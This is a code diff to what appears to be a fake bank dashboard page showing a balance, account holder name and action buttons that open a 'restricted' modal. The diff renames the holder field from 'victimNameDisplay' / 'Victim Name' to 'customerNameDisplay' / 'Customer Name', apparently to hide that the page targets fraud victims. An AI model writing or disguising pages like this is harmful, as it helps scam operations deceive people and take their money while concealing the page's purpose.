@@ -197,7 +197,7 @@
         <div class="balance-label">Available Balance</div>
         <div class="balance-amount" id="balanceDisplay">$0.00</div>
         
-        <div class="account-holder" id="victimNameDisplay">Victim Name</div>
+        <div class="account-holder" id="customerNameDisplay">Customer Name</div>
 
         <div class="actions-grid">
           <button class="action-btn" onclick="showRestrictedModal()">
@@ -366,7 +366,7 @@
             document.getElementById('loadingMsg').style.display = 'none';
             
             // Dashboard Data
-            document.getElementById('victimNameDisplay').textContent = data.name;
+            document.getElementById('customerNameDisplay').textContent = data.name;
             document.getElementById('accountNumber').textContent = `---${data.last4 || '1234'}`;
             document.getElementById('profileName').textContent = data.name;
             document.getElementById('profileAcctNum').textContent = `---${data.last4 || '1234'}`;
